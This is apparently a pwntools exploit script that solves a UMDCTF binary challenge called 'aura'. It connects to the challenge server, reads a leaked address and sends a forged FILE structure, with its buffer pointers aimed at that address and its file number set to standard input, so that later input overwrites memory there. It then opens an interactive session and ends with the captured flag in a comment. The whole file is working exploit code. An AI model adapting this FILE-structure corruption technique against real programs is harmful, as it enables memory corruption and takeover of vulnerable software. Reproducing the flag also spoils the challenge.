from pwn import *

e = ELF("./aura")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
brva 0x124E
brva 0x12BE
'''

p = remote("challs.umdctf.io", 31006)
#p = gdb.debug("./aura", gdbscript = script)

p_recvut(b"my aura: ")
aura = int(p.recvline(), 16)
print(hex(aura))

payload = p64(0) # flag
payload += p64(0) # read_ptr
payload += p64(0) # read_end
payload += p64(0) # read_base
payload += p64(0) # write_base
payload += p64(0) # write_ptr
payload += p64(0) # write_end
payload += p64(aura) # buf_base
payload += p64(aura + 0x10) # buf_end # this shit have to larger than 0x100
payload += p64(0) * 5
payload += p64(0) # fileno

p_s(payload)

sleep(3)

p_s(b"A" * 0x10)

p.interactive()
#UMDCTF{+100aur4}